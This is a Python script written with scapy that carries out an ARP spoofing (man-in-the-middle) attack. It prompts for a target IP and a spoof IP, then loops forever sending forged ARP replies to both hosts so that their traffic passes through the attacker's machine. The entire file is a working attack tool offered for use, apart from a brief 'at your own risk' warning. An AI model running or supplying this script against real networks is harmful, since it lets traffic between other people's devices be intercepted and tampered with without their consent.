#!/usr/bin/env python
import subprocess
import scapy.all as scapy
import time
from os import system
import re

def check_ip():
    system('clear')
    regex = '''^(25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.( 
                25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.( 
                25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.( 
                25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)'''
    subprocess.call(["figlet", "-f", "standard", "ARP-SPOOFING"])
    print(" ------------------------------------------------")
    print("|\033[1;34;1mAuthor's Name\t\t\tDate of Creation |")
    print("|\033[1;34;1mAkib Butt\t\t\t20 Feb 2020\t |")
    print(" ------------------------------------------------")
    print("\033[1;31;1m[!]Warning Run This Script At Your Own Risk..\n")
    target_ip = str(input("\033[1;34;1m[+] Enter Target Ip eg[0.0.0.0]  : "))
    spoof_ip  = str(input("\033[1;34;1m[+] Enter Spoof Ip  eg [0.0.0.0] : "))


    if (re.search(regex, target_ip) and  re.search(regex, spoof_ip)):
        return target_ip,spoof_ip
    # else:
    #     print("Invlaid Ip Please Check It")

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    mac_destination = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_arp = mac_destination/arp_request
    answerd_pkt_list = scapy.srp(combined_arp , timeout=1 , verbose=False)[0]


    client_list=[]
    for elements in answerd_pkt_list:
        client_dict={"ip":elements[1].psrc,"mac":elements[1].hwsrc}
        client_list.append(client_dict)
    for i in client_list:
        return i["mac"]


def spoof(target_ip , spoof_ip):
     target_mac = get_mac(target_ip)

     packet =scapy.ARP(op=2, pdst=target_ip , hwdst=target_mac, psrc=spoof_ip)
     #print(packet.show())
     #print(packet.summary())
     scapy.send(packet,verbose=False)

target=check_ip()
packet_counter=0
try:
     while True:
         try:
             spoof(target[0],target[1])
             spoof(target[1],target[0])
             packet_counter = packet_counter + 2
             print("\r\033[1;34;1m[+] Packet Sent " + str(packet_counter), end=""),
             time.sleep(2)
         except TypeError:
             print("\033[1;31;1m[-] To Bad Input Were Given ..Exiting..bye! :( ")
             exit()
except KeyboardInterrupt:
    print("\n\033[1;31;1m[+] Ctrl+C Detected Quiting....bye")

